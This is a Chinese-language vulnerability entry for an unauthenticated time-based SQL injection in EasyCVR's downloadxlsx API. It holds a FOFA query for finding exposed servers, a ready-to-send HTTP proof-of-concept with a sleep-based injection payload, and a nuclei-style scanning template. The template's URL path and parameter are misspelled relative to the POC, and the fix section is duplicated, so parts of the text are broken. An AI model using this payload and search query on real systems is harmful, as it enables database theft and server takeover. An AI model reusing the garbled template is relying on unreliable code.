# EasyCvr downloadxlsx 存在sql注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | EasyCvr downloadxlsx 存在sql注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | EasyCvr |
| 影响版本 | EasyCvr |
| 严重程度 | 高危 |

## 漏洞概述

EasyCvr downloadxlsx 存在sql注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 测绘语法

详见 `../../vulns/fofa-cache.md`

``` (body="EasyGBS" || body="EasyDarwin.Body" || body="EasyCVR") && (title="" || title="EasyCVR") ```

## 漏洞复现

### POC

```
GET /api/vl/cascade/downloadxlsx?token=and(select*from(select/**/sleep(4))a/**/union/**/select+1)=' HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Cookie: token=iLHaZhzvg
```

特征：延时4秒响应

#

 模板

```yaml
id: easycvr-downloadxlsx-sql
info:
  name: EasyCVR downloadxlsx SQL注入
  severity: high
  tags: easycvr,sql-injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/vl/cascade/dowmloadylcy?tolen=and(select*from(select/**/sleep(4))a/**/union/**/select+1)="
    matchers:
      - type: dsl
        dsl:
          - "duration>=4"
```

## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限

## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限